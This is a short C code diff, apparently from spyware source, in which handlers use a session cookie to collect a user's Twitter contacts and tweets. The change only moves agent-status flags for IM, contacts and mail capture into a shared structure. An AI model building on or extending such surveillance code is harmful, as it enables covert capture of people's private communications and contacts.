@@ -2,14 +2,11 @@
 #include <stdio.h>
 #include <time.h>
 #include "..\common.h"
+#include "../bss.h"
 #include "..\LOG.h"
 #include "SocialMain.h"
 #include "NetworkHandler.h"
 #include "..\bin_string.h"
-
-extern BOOL bPM_IMStarted; // variabili per vedere se gli agenti interessati sono attivi
-extern BOOL bPM_ContactsStarted; 
-extern BOOL bPM_MailCapStarted;
 
 extern DWORD GetLastFBTstamp(char *user, DWORD *hi_part);
 extern void SetLastFBTstamp(char *user, DWORD tstamp_lo, DWORD tstamp_hi);
@@ -249,7 +246,7 @@ DWORD HandleTwitterContacts(char *cookie)
 
 	CheckProcessStatus();
 
-	if (!bPM_ContactsStarted)
+	if (!shared.bPM_ContactsStarted)
 		return SOCIAL_REQUEST_NETWORK_PROBLEM;
 
 	if (scanned)
@@ -568,7 +565,7 @@ DWORD HandleTwitterTweets(char *cookie)
 
 	CheckProcessStatus();
 
-	if (!bPM_IMStarted)
+	if (!shared.bPM_IMStarted)
 		return SOCIAL_REQUEST_NETWORK_PROBLEM;
 
 	// Identifica l'utente
